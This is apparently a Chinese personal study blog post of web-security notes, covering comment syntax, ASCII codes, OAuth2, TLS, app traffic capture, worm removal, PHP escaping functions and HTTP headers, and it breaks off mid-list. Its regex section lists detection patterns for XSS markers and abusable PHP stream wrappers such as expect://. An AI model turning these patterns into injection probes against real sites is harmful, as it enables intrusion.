@@ -1,0 +1,1167 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="一些知识点, Hexo">
+    <meta name="description" content="注释符123456789101112javascript	//	单行	/**/php	// 	#	单行	/**/MySQL注释符有三种：    #注释内容 &amp;quot;--  注释内容&amp;quot; 表示单行注释    /*注释内容*/pht">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>一些知识点 | Hexo</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Hexo</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Hexo</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">一些知识点</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-07-20
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">javascript</span><br><span class="line">	//	单行</span><br><span class="line">	/**/</span><br><span class="line">php</span><br><span class="line">	// 	#	单行</span><br><span class="line">	/**/</span><br><span class="line">MySQL注释符有三种：</span><br><span class="line">    #注释内容 &quot;--  注释内容&quot; 表示单行注释</span><br><span class="line">    /*注释内容*/</span><br><span class="line">phthon</span><br><span class="line">	#注释内容</span><br><span class="line">	&#x27;&#x27;&#x27;注释内容&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">hex		解释</span><br><span class="line">00		空字符</span><br><span class="line">0A		换行符</span><br><span class="line">0D		回车</span><br><span class="line">20		空格</span><br><span class="line">22		&quot;</span><br><span class="line">23		#</span><br><span class="line">25		%</span><br><span class="line">26		&amp;</span><br><span class="line">27		&#x27;</span><br><span class="line">2B		+</span><br><span class="line">2C		，</span><br><span class="line">2D		-</span><br><span class="line">2E		.</span><br><span class="line">2F		/</span><br><span class="line">30-39	字符0-9</span><br><span class="line">3A		:</span><br><span class="line">3B		;</span><br><span class="line">3C		&lt;</span><br><span class="line">3D		=</span><br><span class="line">3E		&gt;</span><br><span class="line">40		@</span><br><span class="line">41-5A	字符A-Z</span><br><span class="line">61-7A	字符a-z</span><br><span class="line">7E		~</span><br><span class="line">7F		删除</span><br></pre></td></tr></table></figure>
+
+<h3 id="OAuth2"><a href="#OAuth2" class="headerlink" title="OAuth2"></a>OAuth2</h3><p><img src="/2023/07/20/%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/oauth2.png" alt="oauth2"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">resource owner是github</span><br><span class="line">resource server和authorization server都是</span><br><span class="line">b步骤获得授权信息是关键</span><br><span class="line">b获得的授权信息可以去获取access_token在用access_token获取资源</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/20/%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/oauth2_2.png" alt="oauth2_2"></p>
+<p><img src="/2023/07/20/%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/implicit_grant.png" alt="implicit_grant"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a步骤授权所需</span><br><span class="line">	应用名称</span><br><span class="line">	应用网站</span><br><span class="line">	重定向url或回调url(redirect_url)</span><br><span class="line">	客户端表示client_id</span><br><span class="line">	客户端密钥client_secret</span><br><span class="line">	</span><br><span class="line">oauth授权方式</span><br><span class="line">	1.授权码模式</span><br><span class="line">		刷新token模式 给了个有效时间和到期更新时提交的fresh_token值</span><br><span class="line">	2.简化模式</span><br><span class="line">		没有重定向的步骤直接返回了token</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/20/%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/安全笔记.assets" alt="implicit_grant"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">密码模式</span><br><span class="line">用户向客户端提供自己的账号密码</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/20/%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/oauth_passwd.png" alt="oauth_passwd"></p>
+<h3 id="https技术鉴赏"><a href="#https技术鉴赏" class="headerlink" title="https技术鉴赏"></a>https技术鉴赏</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://www.bilibili.com/video/BV1uY4y1D7Ng</span><br><span class="line">凯撒密码(简单移位)-&gt;恩格码机(古典密码学)-&gt;DES</span><br><span class="line">需要密钥 DES 56位 对称加密</span><br><span class="line">非对称加密	公钥私钥成对出现</span><br><span class="line">公钥加密只能被私钥解密 私钥加密只能被公钥解密</span><br><span class="line">SSL握手 安全套接字</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/20/%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/ssl.png" alt="ssl"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SSL1.0 2.0 3.0</span><br><span class="line">TLS1.0(SSL3.1) 1.1 1.2 1.3</span><br><span class="line">如果攻击者在获取公钥步骤进行盗取----&gt;&gt;&gt;&gt;CA证书</span><br><span class="line">CA(Certificate Authority)</span><br><span class="line">数据和加密后的数据构成证书</span><br><span class="line"></span><br><span class="line">CA机构造假----&gt;&gt;&gt;&gt;棱镜门</span><br><span class="line">证书透明 证书加入SCT 构成日志 监督日志 像区块链</span><br><span class="line"></span><br><span class="line">仍存在未解决的问题</span><br></pre></td></tr></table></figure>
+
+<h3 id="手机app抓包渗透"><a href="#手机app抓包渗透" class="headerlink" title="手机app抓包渗透"></a>手机app抓包渗透</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">小米路由器需要设置WPA2模式加密</span><br><span class="line">同一局域网下 手机代理ip端口设为pc端局域网ip 192.168.31.90:8881</span><br><span class="line">即可抓包 不过慢</span><br></pre></td></tr></table></figure>
+
+<h3 id="蠕虫病毒Synaptics-exe"><a href="#蠕虫病毒Synaptics-exe" class="headerlink" title="蠕虫病毒Synaptics.exe"></a>蠕虫病毒Synaptics.exe</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">D:\BaiduNetdiskDownload\......\wxappUnpacker\wxappUnpacker.exe 小程序解密文件运行就会出问题</span><br><span class="line"></span><br><span class="line">everything 删除._cache_</span><br><span class="line">删除C:\ProgramData\Synaptics</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/u013102599/article/details/127512616</span><br></pre></td></tr></table></figure>
+
+<h3 id="注册表删除-md后缀默认程序"><a href="#注册表删除-md后缀默认程序" class="headerlink" title="注册表删除.md后缀默认程序"></a>注册表删除.md后缀默认程序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">win11注册表中 第二项影响大于第一项</span><br><span class="line">1.删除	计算机\HKEY_CURRENT_USER\.md</span><br><span class="line">2.删除	计算机\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.md</span><br><span class="line">然后任务管理器重启资源管理器</span><br></pre></td></tr></table></figure>
+
+<h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/ZYC88888/article/details/98479629</span><br><span class="line">\x22	16进制unicode编码</span><br><span class="line">.	点 匹任何单个字符</span><br><span class="line">* &#123;0,&#125;</span><br><span class="line">+ &#123;1,&#125;</span><br><span class="line">? &#123;0,1&#125;	非贪婪模式匹配一个 除了?:(pattern)</span><br><span class="line">[^xyz]	不匹配xyz的单个字符</span><br><span class="line">?!(pattern)</span><br><span class="line">&#x27;oooo&#x27;	&#x27;o+&#x27;--&gt;&gt;[&quot;oooo&quot;]	&#x27;o+?&#x27;--&gt;&gt;[&#x27;o&#x27;, &#x27;o&#x27;, &#x27;o&#x27;, &#x27;o&#x27;]	前者贪婪模式	后者加上?非贪婪模式</span><br><span class="line"></span><br><span class="line">no matching regex</span><br><span class="line">(?:firefox|mozilla|baidu|googleapis|google|fjlqqc|google-analytics|youtube|stripe|fengkongcloud|hcfy|microsoft|firefoxchina|bingapis|wetab|bdimg|azureedge|bing|csdnimg)\.(?:net|org|com|cn|app|link)</span><br><span class="line"></span><br><span class="line">pycharm的正则替换 	ctrl+R	点亮Cc和.* 第一行写正则去匹配 第二行写改变的格式每一个之前匹配的都被搞成变量$1 $2存起来了 然后单机replace all</span><br><span class="line">^([^ ]*): (.*)		此处需要不匹配上面post_data的数据</span><br><span class="line">&quot;$1&quot;: &quot;$2&quot;,</span><br><span class="line"></span><br><span class="line">(&lt;script&gt;)</span><br><span class="line">(?:&lt;script&gt;|onmouseover|)</span><br><span class="line">(?:data|php|zlib|expect|glob|ssh2)(://)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/20/%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/image-20230405144757515.png" alt="image-20230405144757515"></p>
+<h3 id="php-过滤函数"><a href="#php-过滤函数" class="headerlink" title="php 过滤函数"></a>php 过滤函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">★addslashes()</span><br><span class="line">addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</span><br><span class="line">预定义字符是：</span><br><span class="line"> 单引号（&#x27;）</span><br><span class="line"> 双引号（&quot;）</span><br><span class="line"> 反斜杠（\）</span><br><span class="line"> NULL</span><br><span class="line">提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</span><br><span class="line">注释：默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。</span><br><span class="line">语法：addslashes(string)</span><br><span class="line">string 必需。规定要转义的字符串。</span><br><span class="line">返回值： 返回已转义的字符串。</span><br><span class="line">PHP 版本： 4+</span><br><span class="line">★stripslashes()</span><br><span class="line">函数删除由 addslashes() 函数添加的反斜杠。 </span><br><span class="line">★mysql_real_escape_string()</span><br><span class="line">函数转义 SQL 语句中使用的字符串中的特殊字符。</span><br><span class="line">下列字符受影响：</span><br><span class="line">\x00</span><br><span class="line">\n</span><br><span class="line">\r</span><br><span class="line">\ </span><br><span class="line">&#x27; </span><br><span class="line">&quot; </span><br><span class="line">\x1a</span><br><span class="line">如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</span><br><span class="line">语法：mysql_real_escape_string(string,connection)</span><br><span class="line">参数 描述</span><br><span class="line">string 必需。规定要转义的字符串。</span><br><span class="line">connection 可选。规定 MySQL 连接。如果未规定，则使用上一个连接。</span><br><span class="line">说明：本函数将 string 中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用于 mysql_query()</span><br></pre></td></tr></table></figure>
+
+<h3 id="HTTP-头部"><a href="#HTTP-头部" class="headerlink" title="HTTP 头部"></a>HTTP 头部</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">1、 Accept：告诉 WEB 服务器自己接受什么介质类型，*/* 表示任何类型，type/* 表示该类型下的所有子类型，type/sub-type。</span><br><span class="line">2、 Accept-Charset： 浏览器申明自己接收的字符集 Accept-Encoding： 浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate）Accept-Language：：浏览器申明自己接收的语言</span><br><span class="line">语言跟字符集的区别：中文是语言，中文有多种字符集，比如 big5，gb2312，gbk 等等。</span><br><span class="line">3、 Accept-Ranges：WEB 服务器表明自己是否接受获取其某个实体的一部分（比如文件的一部分）的请求。bytes：表示接受，none：表示不接受。</span><br><span class="line">4、 Age：当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间了。</span><br><span class="line">5、 Authorization：当客户端接收到来自 WEB 服务器的 WWW-Authenticate 响应时，用该头部来回应自己的身份验证信息给 WEB 服务器。</span><br><span class="line">6、 Cache-Control：请求：no-cache（不要缓存的实体，要求现在从 WEB 服务器去取）max-age：（只接受 Age 值小于 max-age 值，并且没有过期的对象）max-stale：（可以接受过去的对象，但是过期时间必须小于 max-stale 值）min-fresh：（接受其新鲜生命期大于其当前 Age 跟 min-fresh 值之和的缓存对象）响应：public(可以用 Cached 内容回应任何用户)private（只能用缓存内容回应先前请求该内容的那个用户）no-cache（可以缓存，但是只有在跟 WEB 服务器验证了其有效后，才能返回给客户端）max-age：（本响应包含的对象的过期时间）ALL: no-store（不允许缓存）</span><br><span class="line">7、 Connection：请求：close（告诉 WEB 服务器或者代理服务器，在完成本次请求的响应后，断开连接，不要等待本次连接的后续请求了）。</span><br><span class="line">keepalive（告诉 WEB 服务器或者代理服务器，在完成本次请求的响应后，保持连接，等待本次连接的后续请求）。响应：close（连接已经关闭）。keepalive（连接保持着，在等待本次连接的后续请求）。Keep-Alive：如果浏览器请求保持连接，则该头部表明希望 WEB 服务器保持连接多长时间（秒）。例如：Keep-Alive：300</span><br><span class="line">8、 Content-Encoding：WEB 服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应中的对象。例如：Content-Encoding：gzip</span><br><span class="line">9、Content-Language：WEB 服务器告诉浏览器自己响应的对象的语言。</span><br><span class="line">10、Content-Length：WEB 服务器告诉浏览器自己响应的对象的长度。例如：Content-Length:26012</span><br><span class="line">11、Content-Range： WEB 服务器表明该响应包含的部分对象为整个对象的哪个部分。例如：Content-Range: bytes 21010-47021/47022</span><br><span class="line">12、Content-Type： WEB 服务器告诉浏览器自己响应的对象的类型。例如：Content-Type：application/xml</span><br><span class="line">13、 ETag：就是一个对象（比如 URL）的标志值，就一个对象而言，比如一个 html 文件，如果被修改了，其 Etag 也会别修改，所以 ETag 的作用跟 Last-Modified 的作用差不多，主要供 WEB 服务器判断一个对象是否改变了。比如前一次请求某个 html 文件时，获得了其ETag，当这次又请求这个文件时，浏览器就会把先前获得的 ETag 值发送给 WEB 服务器，然后 WEB 服务器会把这个 ETag 跟该文件的当前 ETag 进行对比，然后就知道这个文件有没有改变了。</span><br><span class="line">14、 Expired：WEB 服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟WEB 服务器验证了其有效性后，才能用来响应客户请求。是 HTTP/1.0 的头部。例如：Expires：Sat, 23 May 2009 10:02:12 GMT</span><br><span class="line">15、 Host：客户端指定自己想访问的 WEB 服务器的域名/IP 地址和端口号。例如：Host：rss.sina.com.cn</span><br><span class="line">16、 If-Match：如果对象的 ETag 没有改变，其实也就意味著对象没有改变，才执行请求的动作。</span><br><span class="line">17、If-None-Match：如果对象的 ETag 改变了，其实也就意味著对象也改变了，才执行请求的动作。</span><br><span class="line">18、 If-Modified-Since：如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作（比如返回对象），否则返回代码 304，告诉浏览器 该对象没有修改。例如：If-Modified-Since：Thu, 10 Apr 2008 09:14:42 GMT</span><br><span class="line">19、If-Unmodified-Since：如果请求的对象在该头部指定的时间之后没修改过，才执行请求的动作（比如返回对象）。</span><br><span class="line">20、 If-Range：浏览器告诉 WEB 服务器，如果我请求的对象没有改变，就把我缺少的部分给我，如果对象改变了，就把整个对象给我。浏览器通过发送请求对象的 ETag 或者 自己所知道的最后修改时间给 WEB 服务器，让其判断对象是否改变了。总是跟 Range 头部一起使用。</span><br><span class="line">21、 Last-Modified：WEB 服务器认为对象的最后修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。例如：Last-Modified：Tue, 06 May 2008 02:42:43 GMT</span><br><span class="line">22、 Location：WEB 服务器告诉浏览器，试图访问的对象已经被移到别的位置了，到该头部指定的位置去取 。 例如 ： Location ： http://i0.sinaimg.cn/dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif</span><br><span class="line">23、 Pramga：主要使用 Pramga: no-cache，相当于 Cache-Control： no-cache。例如：Pragma：no-cache</span><br><span class="line">24、 Proxy-Authenticate： 代理服务器响应浏览器，要求其提供代理身份验证信息。Proxy-Authorization：浏览器响应代理服务器的身份验证请求，提供自己的身份信息。</span><br><span class="line">25、 Range：浏览器（比如 Flashget 多线程下载时）告诉 WEB 服务器自己想取对象的哪部分。例如：Range: bytes=1173546- 26、 Referer：浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL。例如：Referer:http://www.sina.com/</span><br><span class="line">27、 Server: WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61(Unix)</span><br><span class="line">28、 User-Agent: 浏览器表明自己的身份（是哪种浏览器）。例如：User-Agent：Mozilla/5.0(Windows; U; 